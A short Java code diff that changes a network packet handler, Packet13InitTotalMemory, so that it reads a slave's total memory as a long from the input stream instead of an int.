@@ -9,8 +9,8 @@ public class Packet13InitTotalMemory extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		int ram = slave.readInt();
-		slave.setMemory(ram);
+		long total = dis.readLong();
+		slave.setMemory(total);
 	}
 
 }
